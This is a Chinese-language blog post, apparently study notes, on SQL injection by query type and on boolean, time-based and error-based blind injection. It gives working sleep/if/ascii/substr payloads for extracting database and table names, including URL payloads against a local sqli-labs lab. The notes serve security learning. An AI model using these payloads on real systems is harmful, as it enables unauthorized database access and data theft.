---
title: "查询方式及报错注入" # 文章标题.
date: 2022-10-26
draft: false
tags: ["WEB安全"]
categories: ["WEB安全"]
---

# 查询方式及报错注入

当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作。

## select 查询数据

在网站应用中进行数据显示查询操作

例：`select * from news where id=$id`

## insert 插入数据

在网站应用中进行用户注册添加等操作

例：`insert into news(id,url,text) values(2,'x','$t')`

注入参数写在哪里都可以最主要的是看是否引号的闭合，要是有闭合的话，要把引号给闭合了

## delete 删除数据

后台管理里面删除文章删除用户等操作

例：`delete from news where id=$id`

## update 更新数据

会员或后台中心数据同步或缓存等操作

例：`update user set pwd='$p' where id=2 and username='admin'`

## order by 排序数据

一般结合表名或列名进行数据排序操作

例：

```mysql
select * from news order by $id
select id,name,price from news order by $order
```

我们可以通过注入点产生的方式或应用的效果，猜测到对方SQL语句查询的方法。

## SQL注入报错盲注

盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：

这些报错盲注的使用顺序：报错回显，逻辑判断，延时注入。

### 基于布尔的SQL盲注-逻辑判断

`regexp`，`like`，`ascii`，`left`，`ord`，`mid`

```mysql
like 'ro%' # 判断 ro 或 ro...是否成立

regexp '^like[a-z]' # 匹配 like 及 like...等

mid(a,b,c) # 从位置b[从1开始]开始，截取 a 字符串的c[一般情况下是1]位
eg:select mid('2022-10-23',1,2); # 20

ord=ascii(x)=97 # 判断 x 的 ascii 码是否等于 97
# 一般情况下使用ASCII码的方式较为多，因为这样的话，你在写脚本的时候，可以直接一个for循环将所有的可能性全部的进行遍历，更加的方便。
# 如果你使用mid和substr这类的函数，里面必然会涉及到',然而使用引号可能会出现转义。使用ASCII编码可以进行绕过。
select username from users where id = 1 and sleep(if(ascii(mid(database(),1,1))=112,5,0));
select username from users where id = 1 and if(ascii(substr(database(),1,1))=112,sleep(5),0); # 以上这两种方式都是一样的，与sleep的位置

left(database(),1) # left(a,b)从左侧截取 a 的前 b 位
SELECT * FROM users WHERE id='1' and left(version(),3)='5.5';

substr(a,b,c) # 从 b 位置开始，截取字符串 a 的 c 长度
eg:select substr('2022-10-23',2,4); # 022-

length(database())=8 # 判断数据库 database()名的长度
```

逻辑判断的一般用法：

```mysql
select * from member where id = 1 and sleep(if(mid(database(),1,1)='p',1,0)); # 逐个去爆破数据库名的每一个字符
# 在URL中的写法
http://192.168.132.128/sqli-libs/Less-2/?id=1 and sleep(if(mid(database(),1,1)='s',5,0))--+ # 逐个去分解每一个数据库的字符。
http://192.168.132.128/sqli-libs/Less-2/?id=1 and sleep(if(mid(database(),2,1)='e',5,0))--+ # 去猜解数据库名的第二个字符。

http://192.168.132.128/sqli-libs/Less-2/?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=101),sleep(5),0)--+ # 这个是查询数据库的第一个表，要想查询数据库的第二个表只需将limit的值进行修改即可

select * from users where id = 1 and if(ascii(substr((select table_name from information_schema.tables where tabl
e_schema=database() limit 0,1),1,1))=101,sleep(5),0); # 查询数据库对应的第一个表

select * from users where id = 1 and if(ascii(substr((select table_name from information_schema.tables where tabl
e_schema=database() limit 1,1),1,1))=114,sleep(5),0); # 查询数据库对应的第二表，通过控制limit来控制查询的表

select * from users where id = 1 and if(substr((select table_name from information_schema.tables where table_sche
ma=database() limit 1,1),1,2)='re',sleep(5),0); #查询数据库的第二个表的前两个字符
```

这类不会回显

### 基于时间的SQL盲注-延时判断

`if`，`sleep`

```mysql
if(条件,5,0)  #条件成立 返回 5 反之 返回 0
select if(database()='pikachu','pikachu','error'); # if的使用案例，这个返回的是pikachu
sleep(5)  #SQL 语句延时执行 5 秒
# SQL语句中常见的写法
select * from member where id = 1 and sleep(1); # Empty set (1.00 sec) 这是显示的结果，是休眠1秒之后在执行
select * from member where id = 1 and sleep(6); # Empty set (6.00 sec)
```

这两个关键字的联合使用

```mysql
select * from member where id = 1 and sleep(if(database()='pikachu',1,0));
# 通过这种方式可以进行数据库名的猜解，不需要回显，回显的是时间。
http://192.168.132.128/sqli-libs/Less-2/?id=1 and sleep(if(database()='security',10,0))--+ # 这个是判断数据库的数据库名
http://192.168.132.128/sqli-libs/Less-2/?id=1%20and%20sleep(if(length(database())=8,5,0))--+ # 判断数据库名的长度
```

这类不会回显

### 基于报错的SQL盲注-报错回显

`floor`，`updatexml`，`extractvalue`

对方不会回显，但是让其强制回显。

在抓包的时候，使用GET请求的话，如何要提交多个参数的话，为了防止HTTP头的语法解析，所以必须要使用+或者%20进行替换空格，这个只在数据包中这样使用，因为在数据包中，数据包是由空格来分割相应的数据的。

## 补充：

https://www.jianshu.com/p/bc35f8dd4f7c # 12种注入方式补充。

https://www.jianshu.com/p/fcae21926e5c # order by

